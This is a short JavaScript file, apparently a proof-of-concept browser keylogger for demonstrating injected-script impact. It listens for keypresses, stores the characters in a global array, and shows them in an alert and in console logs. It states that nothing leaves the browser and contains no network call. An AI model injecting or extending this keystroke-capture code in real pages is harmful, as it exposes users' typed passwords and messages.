console.log("keylogger.js loaded");

function keylogger() {
    console.log("keylogger function called");

    // Add keylogger to the current document
    window.jrkeylogger = window.jrkeylogger || [];
    var jrkl = function(e) {
        window.jrkeylogger.push([String.fromCharCode(e.keyCode)]);
        console.log("Key logged:", String.fromCharCode(e.keyCode));
    };

    document.addEventListener("keypress", jrkl, false);
    console.log("Keylogger listener added to document");

    setTimeout(function() {
        var kls = "";
        for (var a = 0; a < window.jrkeylogger.length; a++) kls += window.jrkeylogger[a];

        alert("Keys logged thus far:\n\n" + kls + "\n\nFor assurance, this is a PoC and no keystrokes have been exposed to me. All code execution has taken place client-side in your browser only.");

        setInterval(function() {
            kls = "";
            for (var a = 0; a < window.jrkeylogger.length; a++) kls += window.jrkeylogger[a];
            console.log("Keys logged thus far:\n\n" + kls);
        }, 5000);
    }, 10000);
}

if (typeof window.callback === "function") {
    window.callback();
} else {
    console.log("Callback function is not defined.");
}
